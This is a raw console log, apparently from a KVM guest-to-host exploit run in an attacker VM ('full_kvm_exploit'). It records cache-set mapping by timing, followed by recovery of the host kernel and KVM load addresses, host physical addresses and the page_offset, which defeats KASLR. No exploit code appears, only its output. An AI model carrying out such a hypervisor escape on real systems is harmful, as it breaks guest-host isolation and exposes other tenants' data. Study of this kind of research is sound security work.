+[13:37:59] testing for unmapped lines in set: 99%
+[13:37:59] found set: id=175, size=131 (98% of expected) after 1 loops
+[13:37:59] attempt_lines=247
+[13:37:59] testing for unmapped lines in set: 99%
+[13:37:59] found set: id=176, size=146 (109% of expected) after 1 loops
+[13:37:59] attempt_lines=235
+[13:38:00] testing for unmapped lines in set: 99%
+[13:38:00] found set: id=177, size=138 (103% of expected) after 1 loops
+[13:38:00] attempt_lines=222
+[13:38:00] testing for unmapped lines in set: 99%
+[13:38:00] found set: id=178, size=129 (96% of expected) after 1 loops
+[13:38:00] attempt_lines=209
+[13:38:00] testing for unmapped lines in set: 99%
+[13:38:00] found set: id=179, size=134 (100% of expected) after 1 loops
+[13:38:00] attempt_lines=196
+[13:38:01] testing for unmapped lines in set: 98%
+[13:38:01] found set: id=180, size=123 (92% of expected) after 3 loops
+[13:38:01] attempt_lines=183
+[13:38:01] testing for unmapped lines in set: 99%
+[13:38:01] found set: id=181, size=119 (89% of expected) after 1 loops
+[13:38:01] attempt_lines=170
+[13:38:01] testing for unmapped lines in set: 98%
+[13:38:01] found set: id=182, size=110 (82% of expected) after 1 loops
+[13:38:01] attempt_lines=157
+[13:38:01] testing for unmapped lines in set: 99%
+[13:38:01] found set: id=183, size=122 (91% of expected) after 1 loops
+[13:38:01] attempt_lines=143
+[13:38:01] testing for unmapped lines in set: 99%
+[13:38:01] found set: id=184, size=125 (93% of expected) after 2 loops
+[13:38:01] attempt_lines=130
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=185, size=122 (91% of expected) after 2 loops
+[13:38:02] attempt_lines=116
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=186, size=124 (93% of expected) after 1 loops
+[13:38:02] attempt_lines=102
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=187, size=123 (92% of expected) after 4 loops
+[13:38:02] attempt_lines=87
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=188, size=122 (91% of expected) after 8 loops
+[13:38:02] attempt_lines=73
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=189, size=117 (87% of expected) after 6 loops
+[13:38:02] attempt_lines=58
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=190, size=105 (78% of expected) after 4 loops
+[13:38:02] attempt_lines=41
+[13:38:02] testing for unmapped lines in set: 99%
+[13:38:02] found set: id=191, size=106 (79% of expected) after 3 loops
+[13:38:02] attempt_lines=25
+[13:38:03] testing for unmapped lines in set: 98%
+[13:38:03] found set: id=192, size=82 (61% of expected) after 1 loops
+[13:38:03] remaining cachelines (not detected while scanning for other cachelines in sets): 0
+[13:38:03] === starting find_phys_mapping_kassist ===
+[13:38:03] cold min: 244
+[13:38:03] hot avg: 32892457/999988 = 32
+[13:38:03] hot_cold_limit: 173
+[13:38:04] false hot: 0, false cold: 7 (each in 1000000)
+[13:38:04] kernel_load_address: 0xffffffffbc000000
+[13:38:04] kvm_load_address: 0xffffffffc0664000
+[13:38:04] kvm_intel_load_address (truncated): 0xc5000
+[13:38:19] cycles=183000; step=1/100; addr=0x71161000
+[13:38:34] cycles=185000; step=2/100; addr=0x113002000
+[13:38:49] cycles=179000; step=3/100; addr=0x1226e3000
+[13:39:04] cycles=186000; step=4/100; addr=0x1dcc24000
+[13:39:19] cycles=186000; step=5/100; addr=0x297165000
+[13:39:34] cycles=182000; step=6/100; addr=0x2efc26000
+[13:39:49] cycles=184000; step=7/100; addr=0x379427000
+[13:40:04] cycles=180000; step=8/100; addr=0x3a11a8000
+[13:40:19] cycles=182000; step=9/100; addr=0x3f9c69000
+[13:40:34] cycles=183000; step=10/100; addr=0x46adca000
+[13:40:49] cycles=183000; step=11/100; addr=0x4dbf2b000
+[13:41:04] cycles=184000; step=12/100; addr=0x56572c000
+[13:41:19] cycles=183000; step=13/100; addr=0x5d688d000
+[13:41:34] cycles=185000; step=14/100; addr=0x67872e000
+[13:41:49] cycles=185000; step=15/100; addr=0x71a5cf000
+[13:42:04] cycles=170000; step=16/100; addr=0x64e110000
+[13:42:19] cycles=183000; step=17/100; addr=0x6bf271000
+[13:42:34] cycles=183000; step=18/100; addr=0x7303d2000
+[13:42:49] cycles=181000; step=19/100; addr=0x7707f3000
+[13:43:04] cycles=184000; step=20/100; addr=0x7f9ff4000
+[13:43:19] cycles=182000; step=21/100; addr=0x852ab5000
+[13:43:34] cycles=184000; step=22/100; addr=0x8dc2b6000
+[13:43:49] cycles=186000; step=23/100; addr=0x9967f7000
+[13:44:02] ### idx=066 set_id=073 phys_addr=0x791b38000 cheat_phys_addr=0xffffffffffffffff
+[13:44:02] testing candidate...
+[13:44:03] success! count=2425
+[13:44:03] === starting find_page_offset ===
+[13:44:03] cold min: 219
+[13:44:04] hot avg: 33026356/999996 = 33
+[13:44:04] hot_cold_limit: 157
+[13:44:04] false hot: 0, false cold: 10 (each in 1000000)
+[13:44:04] phys_addr=0x791b38000 real_phys_addr=0xffffffffffffffff real_virt_addr=0xffffffffffffffff real_page_offset=0
+[13:44:10] ### page_offset=0xffff8c22c0000000
+[13:44:10] testing candidate...
+[13:44:11] success! count=19182
+[13:44:11] === starting select_set ===
+[13:44:11] cold min: 232
+[13:44:11] hot avg: 32996260/999988 = 32
+[13:44:11] hot_cold_limit: 165
+[13:44:12] false hot: 0, false cold: 15 (each in 1000000)
+[13:44:12] host-virtual kernel address for shared page: 0xffff8c2a51b38018
+[13:44:15] collecting samples (199/200)...
+[13:44:15] top result: set_id=28, count=199
+[13:44:15] second result: set_id=127, count=1
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# 
+
+
